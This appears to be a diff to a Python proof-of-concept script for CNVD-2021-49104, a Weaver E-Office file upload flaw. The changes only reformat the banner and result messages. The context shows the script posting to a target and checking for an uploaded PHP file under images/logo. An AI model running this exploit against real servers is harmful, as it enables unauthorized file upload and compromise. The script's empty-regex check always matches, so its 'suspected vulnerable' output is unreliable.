@@ -9,8 +9,10 @@ import io
 sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
 
 author = '''
-CNVD-2021-49104 泛微E-Office文件上传漏洞\n
-by novy\n\n'''
+---------------------------------------
+CNVD-2021-49104 泛微E-Office文件上传漏洞
+by novy
+---------------------------------------\n'''
 print(author)
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
@@ -34,8 +36,9 @@ rep = requests.post(url, data=data, headers=headers, proxies=proxies)
 html = rep.content
 html1=html.decode('utf-8')
 if re.findall(r'logo_eoffice', html1):
-	print("\n漏洞存在，验证地址：http://localhost/images/logo/logo-eoffice.php")
-if re.findall(r'', html1):
-	print("\n漏洞疑似存在，请验证：http://localhost/images/logo/logo-eoffice.php")
+	print("\n[+]漏洞存在，验证地址：\nhttp://localhost/images/logo/logo-eoffice.php")
+if rep.status_code == 200:
+    if re.findall(r'', html1):
+        print("\n[+]漏洞疑似存在，请验证：\nhttp://localhost/images/logo/logo-eoffice.php")
 if rep.status_code != 200:
-	print("异常，状态码：",rep.status_code)
+	print("[!]异常，状态码：",rep.status_code)
